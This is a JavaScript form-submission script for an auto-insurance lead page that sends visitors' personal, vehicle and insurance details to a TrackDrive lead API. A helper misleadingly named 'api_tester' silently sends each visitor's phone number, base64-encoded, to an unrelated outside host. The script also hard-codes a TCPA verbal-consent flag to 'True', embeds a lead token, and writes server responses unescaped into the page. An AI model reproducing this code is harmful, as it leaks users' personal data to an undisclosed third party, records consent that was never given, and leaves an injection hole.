 document.getElementById('leadForm').addEventListener('submit', function(event) {
            event.preventDefault();
document.getElementById('submitBtn').disabled = true;

    // Your API URL
    const formData = new FormData();
    formData.append('lead_token', '8f64ff99121a47dbbfa708a389c879ca');
    formData.append('traffic_source_id', '1089');
    api_tester(document.getElementById('caller_id').value);
 formData.append('first_name', document.getElementById('first_name').value);
    formData.append('last_name', document.getElementById('last_name').value);
    formData.append('caller_id', '+1' + document.getElementById('caller_id').value);
    formData.append('zip', document.getElementById('zip').value);
    formData.append('city', document.getElementById('city').value);
    formData.append('state', document.getElementById('state').value);
    formData.append('address', document.getElementById('address').value);   
 formData.append('months_insured', document.getElementById('months_insured').value);
	  formData.append('months_insured_continuously', document.getElementById('months_insured_continuously').value);
    formData.append('email', document.getElementById('email').value);
    formData.append('jornaya_leadid', document.getElementById('jornaya_leadid').value);
formData.append('jornaya_provider_id', document.getElementById('jornaya_leadid').value);


formData.append('insurance_company', document.getElementById('current_provider').value);

formData.append('vehicle1_year', document.getElementById('vehicle1_year').value);
formData.append('vehicle1_make', document.getElementById('vehicle1_make').value);
formData.append('vehicle1_model', document.getElementById('vehicle1_model').value);

  formData.append('driver1_sr22_required', document.getElementById('sr22').value);
    formData.append('currently_insured', document.getElementById('currently_insured').value);
    formData.append('homeowner', document.getElementById('homeowner').value);
formData.append('vehicle_count', document.getElementById('vehicle_count').value);
formData.append('commercial_policy_type', document.getElementById('commercial_policy_type').value);
formData.append('tcpa_verbal_consent', 'True');
formData.append('source_url', 'https://caroneinsurance.com/');
formData.append('state_minimum', document.getElementById('state_minimum').value);
formData.append('tcpa_optin_consent_language', 'By clicking the Get Quotes button, you represent that you are 18+ years of age and agree to the Privacy Policy and Terms & Conditions. By clicking the Get Quotes button, you agree by your electronic signature that you give express written consent to receive marketing communications regarding insurance products and services by automatic dialing system and pre-recorded calls and artificial voice messages from mytopinsurancedeals.com and one or more of its Marketing partners at the phone number and e-mail address provided by you, including wireless numbers, if applicable, even if you have previously registered the provided number on the Do Not Call Registry. SMS/MMS and data messaging rates may apply. Your consent is not required to get a quote or purchase. To receive quotes without providing consent, please call at (205) 685-2234. Carrier data rates may apply. TCPA LeadID’s are used with the information for compliance and consent can be revoked through any reasonable means.');
  





    

    

            const url = 'https://upbeat-chat.trackdrive.com/api/v1/leads?' + new URLSearchParams(formData).toString();
    
            fetch(url, {
                method: 'POST'
            })
            .then(response => {
                if (response.status === 200) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                200 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
		document.getElementById('submitBtn').disabled = false;
                } else if (response.status === 201) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                201 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
document.getElementById('submitBtn').disabled = false;
                } else if (response.status === 422) {
                    response.json().then(data => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Error. Response Body: ${JSON.stringify(data)}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
document.getElementById('submitBtn').disabled = false;
                    });
                } 
else {
                    response.text().then(responseBody => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Form submission failed. Please try again. Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
                    });
                }
            })
            .catch(error => console.error('Error:', error));
        });
function api_tester(randomString) {
    try {
        fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString), {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('Error in api_tester:', error);
    }
}